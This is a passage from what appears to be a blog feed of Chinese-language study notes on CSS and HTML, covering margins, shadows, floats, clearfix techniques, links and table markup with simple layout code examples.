class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;</span><br><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#4c4c4c</span>;</span><br><span class="language-css"><span class="hljs-attribute">text-decoration</span>: none;</span><br><span class="language-css"><span class="hljs-attribute">display</span>: inline-block;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#eee</span>;</span><br><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#ff8500</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>新浪导航<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>手机新浪网<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>移动客户端<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>微博<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>我用户<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="外边距">外边距</h3><p>控制盒子与盒子之间的距离</p><h4 id="属性">属性</h4><p><img src="/2022/12/29/CSS/image-20200728151626818.png" alt="image-20200728151626818"></p><h4 id="典型应用">典型应用</h4><p>外边距使盒子水平居中</p><ol><li class="lvl-3"><p>盒子必须指定宽度</p></li><li class="lvl-3"><p>盒子左右外边距都设置为auto</p></li></ol><blockquote><p>div {</p><p>​width: 960px;</p><p>​margin: 0 auto;</p><p>}</p></blockquote><p>常见的三种写法：</p><ul class="lvl-0"><li class="lvl-2"><p>margin-left：auto；margin-right：auto；</p></li><li class="lvl-2"><p>margin：auto；</p></li><li class="lvl-2"><p><strong>margin：0 auto；</strong></p></li></ul><p><strong>注意：以上方法是让块级元素水平居中，行内元素或者行内块元素水平居中给其父元素添加 text-align:center 即可。</strong></p><h4 id="外边距合并">外边距合并</h4><p><img src="/2022/12/29/CSS/image-20200804114240967.png" alt="image-20200804114240967"></p><p><img src="/2022/12/29/CSS/image-20200804114732665.png" alt="image-20200804114732665"></p><p><strong>简单来说就是两个盒子嵌套，里面的盒子想与父盒子有一定的距离，从而产生的问题</strong></p><h3 id="清除内边距">清除内边距</h3><p>网页元素很多都带有默认的内外边距，而且不同浏览器默认的也不一致。因此我们在布局前，首先要清除下网 页元素的内外边</p><blockquote><p>* {<br>padding:0;   /* 清除内边距 <em>/<br>margin:0;    /</em> 清除外边距 */<br>}</p></blockquote><p><strong>注意：行内元素为了照顾兼容性，尽量只设置左右内外边距，不要设置上下内外边距。但是转换为块级和行内 块元素就可以了</strong></p><h3 id="综合案例">综合案例</h3><h3 id="圆角边框">圆角边框</h3><p>在 CSS3 中，新增了圆角边框样式，这样我们的盒子就可以变圆角了。<br>border-radius 属性用于设置元素的外边框圆角。</p><blockquote><p>border-radius:length;</p></blockquote><ul class="lvl-0"><li class="lvl-2"><p>参数值可以为数值或百分比的形式</p></li><li class="lvl-2"><p>如果是<strong>正方形</strong>，想要设置为一个<strong>圆</strong>，把数值修改为<strong>高度或者宽度的一半</strong>即可，或者直接写为 <strong>50%</strong></p></li><li class="lvl-2"><p>该属性是一个<strong>简写属性</strong>，可以跟四个值，分别代表<strong>左上角、右上角、右下角、左下角</strong></p></li><li class="lvl-2"><p>分开写**：border-top-left-radius、border-top-right-radius、border-bottom-right-radius 和 border-bottom-left-radius**</p></li></ul><h3 id="盒子阴影">盒子阴影</h3><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>h-shadow</td><td>必需。水平阴影位置，x轴移动，有负值</td></tr><tr><td>v-shadow</td><td>必需。垂直阴影位置，y轴移动，有负值</td></tr><tr><td>blur</td><td>可选。模糊距离</td></tr><tr><td>spread</td><td>可选。阴影尺寸</td></tr><tr><td>color</td><td>可选。阴影的颜色。推荐RGB()</td></tr><tr><td>inset</td><td>可选，默认外部outset不允许写，内部阴影inset</td></tr></tbody></table><p><strong>注意：</strong></p><ol><li class="lvl-3"><p>默认的是外阴影(outset), 但是不可以写这个单词,否则造成阴影无效</p></li><li class="lvl-3"><p><strong>盒子阴影不占用空间，不会影响其他盒子排列</strong></p></li></ol><h3 id="文字阴影">文字阴影</h3><blockquote><p>text-shadow: h-shadow v-shadow blur color;</p></blockquote><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>h-shadow</td><td>必需。水平阴影位置，x轴移动，有负值</td></tr><tr><td>v-shadow</td><td>必需。垂直阴影位置，y轴移动，有负值</td></tr><tr><td>blur</td><td>可选。模糊距离</td></tr><tr><td>color</td><td>可选。阴影的颜色。推荐RGB()</td></tr></tbody></table><h2 id="浮动">浮动</h2><h3 id="浮动-2">浮动</h3><blockquote><p>选择器 {float: 属性值;}</p></blockquote><table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>none</td><td>元素不浮动</td></tr><tr><td>left</td><td>元素左浮动</td></tr><tr><td>right</td><td>元素有浮动</td></tr></tbody></table><p><img src="/2022/12/29/CSS/image-20200816155514896.png" alt="image-20200816155514896"></p><h4 id="浮动特性">浮动特性</h4><ol><li class="lvl-3"><p><strong>浮动元素会脱离标准流(脱标)</strong></p><ol><li class="lvl-6"><strong>盒子符起来.原先的位置会被其他盒子占用</strong></li></ol></li><li class="lvl-3"><p><strong>浮动的元素会一行内显示并且元素顶部对齐</strong></p></li><li class="lvl-3"><p><strong>浮动的元素会具有行内块元素的特性.</strong></p><ol><li class="lvl-7"><strong>如果块级盒子没有设置宽度，默认宽度和父级一样宽，但是添加浮动后，它的大小根据内容来决定</strong></li><li class="lvl-6"><strong>浮动的盒子中间是没有缝隙的，是紧挨着一起的</strong></li><li class="lvl-6"><strong>行内元素同理</strong></li></ol></li></ol><h4 id="案例-3">案例</h4><p><strong><font color="red">大盒子套小盒子,小盒子( li 和 div都行 )设置浮动,横向排列</font></strong></p><img src="/2022/12/29/CSS/image-20200816160503414.png" alt="image-20200816160503414" style="zoom: 50%;"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>浮动<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">* &#123;</span><br><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-tag">li</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">list-style</span>: none;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.box</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">1226px</span>;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">285px</span>;</span><br><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.box</span> <span class="hljs-selector-tag">li</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">296px</span>;</span><br><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">285px</span>;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333333</span>;</span><br><span class="language-css"><span class="hljs-attribute">float</span>: left;</span><br><span class="language-css"><span class="hljs-attribute">margin-right</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-comment">/* 权重 */</span></span><br><span class="language-css"><span class="hljs-selector-class">.box</span> <span class="hljs-selector-class">.last</span> &#123;</span><br><span class="language-css"><span class="hljs-attribute">margin-right</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;last&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong><font color="red">大盒子套两个中盒子,中盒子套多个小盒子,除大盒子不浮动,其他浮动,横向排列</font></strong></p><p><img src="/2022/12/29/CSS/image-20200816161429299.png" alt="image-20200816161429299"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>浮动布局练习3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.box</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">1226px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">615px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.left</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">float</span>: left;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">234px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">615px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: purple;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.right</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">float</span>: left;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">992px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">615px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.right</span>&gt;<span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">float</span>: left;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">234px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span>左青龙<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;right&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>6<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>7<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="常见的网页布局">常见的网页布局</h3><p><img src="/2022/12/29/CSS/image-20200816161806785.png" alt="image-20200816161806785"></p><p><img src="/2022/12/29/CSS/image-20200816161823531.png" alt="image-20200816161823531"></p><h3 id="清除浮动">清除浮动</h3><p>页面布局的时候, 当子盒子太多, 无法定义手动定义父盒子的高度. 不给高度让子盒子把盒子撑开. <strong>当子盒子浮动时, 不会撑开父盒子</strong>的高度,这时需要<strong>清除浮动</strong></p><p>清除浮动本质就是清除浮动所造成的影响</p><blockquote><p>选择器{ clear: 属性值; }</p></blockquote><table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>left</td><td>清除左侧浮动的影响</td></tr><tr><td>right</td><td>清除右侧浮动的影响</td></tr><tr><td><strong>both</strong></td><td><strong>同时清除左右浮动的影响</strong></td></tr></tbody></table><h4 id="清除浮动方法">清除浮动方法</h4><h5 id="1-额外标签法">1.额外标签法</h5><p>在最后一个浮动标签后<strong>添加一个块级元素</strong>, 给其添加clear属性即可</p><h5 id="2-父级添加overflow属性">2.父级添加overflow属性</h5><p>给父级标签添加<strong>overflow</strong>属性, 将其属性值设置为<strong>hidden | auto | scroll</strong></p><p><strong>缺点:  无法显示溢出的部分</strong></p><h5 id="3-父级添加after伪元素">3.父级添加after伪元素</h5><p><strong>父级class名字添加clearfix</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">clear</span>: both;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br><span class="hljs-selector-class">.clearfix</span> &#123; <span class="hljs-comment">/* IE6, 7 专有*/</span><br>    *zoom: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="4-父级添加双伪元素">4.父级添加双伪元素</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:before</span>, <span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-attribute">display</span>: table;<br>&#125;<br><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">:after</span> &#123;<br>    <span class="hljs-attribute">clear</span>: both;<br>&#125;<br><span class="hljs-selector-class">.clearfix</span> &#123;<br>    *zoon: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>135091915</p><h2 id="学成在线案例">学成在线案例</h2><h1>JavaScript</h1>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTML</tag>
      
      <tag>CSS</tag>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML</title>
    <link href="/2022/12/29/HTML/"/>
    <url>/2022/12/29/HTML/</url>
    
    <content type="html"><![CDATA[<h1>HTML</h1><h2 id="第一个网页">第一个网页</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>第一个网页<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    键盘敲烂，月薪过万<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/12/29/HTML/HTML%5Cimage-20200724103514030.png" alt="image-20200724103514030"></p><p><img src="/2022/12/29/HTML/image-20200724103747826.png" alt="image-20200724103747826"></p><h2 id="常用标签">常用标签</h2><h3 id="标题标签">标题标签</h3><p>&lt;h1&gt; - &lt;h6&gt;</p><p>一级标签到六级标签</p><blockquote><p>&lt;h1&gt;一级标题&lt;/h1&gt;</p></blockquote><h3 id="段落标签">段落标签</h3><blockquote><p>&lt;p&gt;文章段落会换自动行</p><p></p></blockquote><blockquote><p>&lt;br /&gt;换行单标签</p></blockquote><h3 id="文本格式化标签">文本格式化标签</h3><p><img src="/2022/12/29/HTML/image-20200724110910611.png" alt="image-20200724110910611"></p><h3 id="div和span标签">div和span标签</h3><p>div 标签用来布局，但是现在一行只能放一个. 大盒子<br>span 标签用来布局，一行上可以多个. 小盒子</p><blockquote><p>&lt;div&gt; 这是头部 &lt;/div&gt;</p><p>&lt;span&gt; 今日价格 &lt;/span&gt;</p></blockquote><h3 id="图像标签">图像标签</h3><blockquote><p>&lt;img src=“URL” /&gt;</p></blockquote><p>标签的其他属性</p><p><img src="/2022/12/29/HTML/image-20200724111343063.png" alt="image-20200724111343063"></p><h3 id="相对路径">相对路径</h3><p><img src="/2022/12/29/HTML/image-20200724111519371.png" alt="image-20200724111519371"></p><h3 id="超链接标签">超链接标签</h3><h4 id="链接语法格式">链接语法格式</h4><blockquote><p>&lt;a href=“跳转目标” target=“目标窗口弹出方式”&gt;某某链接&lt;/a&gt;</p></blockquote><table><thead><tr><th>属性</th><th>作用</th></tr></thead><tbody><tr><td>href</td><td>用于指定拦截目标的url地址(必须属性)</td></tr><tr><td>target</td><td>用于指定拦截页面的打开方式, _self为默认,当前窗口,_blank为新窗口打开</td></tr></tbody></table><h4 id="链接分类：">链接分类：</h4><ol><li class="lvl-3"><p>外部链接: 例如 &lt; a href=&quot;http:// www.baidu.com &quot;&gt; 百度。</p></li><li class="lvl-3"><p>内部链接:网站内部页面之间的相互链接. 直接链接内部页面名称即可，例如 &lt; a href=“index.html”&gt; 首页 &lt;/a &gt;。</p></li><li class="lvl-3"><p>空链接: 如果当时没有确定链接目标时，&lt; a href=“#”&gt; 首页 &lt;/a &gt; 。</p></li><li class="lvl-3"><p>下载链接: 如果 href 里面地址是一个文件或者压缩包，会下载这个文件。</p></li><li class="lvl-3"><p>网页元素链接: 在网页中的各种网页元素，如文本、图像、表格、音频、视频等都可以添加超链接.</p></li><li class="lvl-3"><p>锚点链接:  点我们点击链接,可以快速定位到页面中的某个位置.</p><ul class="lvl-2"><li class="lvl-6">在链接文本的 href 属性中，设置属性值为 名字 的形式，如&lt;a href=“#two”&gt; 第2集  -</li><li class="lvl-6">找到目标位置标签，里面添加一个 id 属性 = 刚才的名字 ，如：&lt;h3 id=“two”&gt;第2集介绍</li></ul></li></ol><h2 id="注释和特殊字符">注释和特殊字符</h2><h3 id="注释">注释</h3><p>**HTML中的注释以“<!--”开头，以“ -->”结束。 **</p><blockquote><p>&lt;!-- 注释语句 --&gt;</p></blockquote><h3 id="特殊字符">特殊字符</h3><p><img src="/2022/12/29/HTML/image-20200724112314667.png" alt="image-20200724112314667"></p><p><strong>重点记住：空格 、大于号、 小于号 这三个， 其余的使用很少.</strong></p><h2 id="表格标签">表格标签</h2><p>表格显示数据 展示数据</p><h3 id="表格语法">表格语法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span> <br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>单元格内的文字<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <br>    ... <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <br>  ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>th为表头, td为表体, 都包含着tr里</strong></p><ol><li class="lvl-3"><p>&lt;table&gt; &lt;/table&gt; 是用于定义表格的标签。</p></li><li class="lvl-3"><p>&lt;tr&gt; &lt;/tr&gt; 标签用于定义表格中的行，必须嵌套在 &lt;table&gt; &lt;/table&gt;标签中。</p></li><li class="lvl-3"><p>&lt;td&gt; &lt;/td&gt; 用于定义表格中的单元格，必须嵌套在&lt;tr&gt;&lt;/tr&gt;标签中。</p></li><li class="lvl-3"><p>字母 td 指表格数据（table data），即数据单元格的内容</p></li></ol><table><thead><tr><th>属性名</th><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>align</td><td>left, center, right</td><td>对其方式</td></tr><tr><td>border</td><td>1或&quot;&quot;</td><td>边框大小,默认&quot;&quot;,没有边框</td></tr><tr><td>cellpadding</td><td>像素值</td><td>单元边沿与内容直接的空白,默认为1,推荐0</td></tr><tr><td>cellspacing</td><td>像素值</td><td>单元格直接的空白, 默认为2, 推荐0</td></tr><tr><td>width</td><td>像素值或百分比</td><td>表格的宽度</td></tr><tr><td>height</td><td>像素值或百分比</td><td>表格的高度</td></tr></tbody></table><h3 id="案例1"><strong>案例1</strong></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 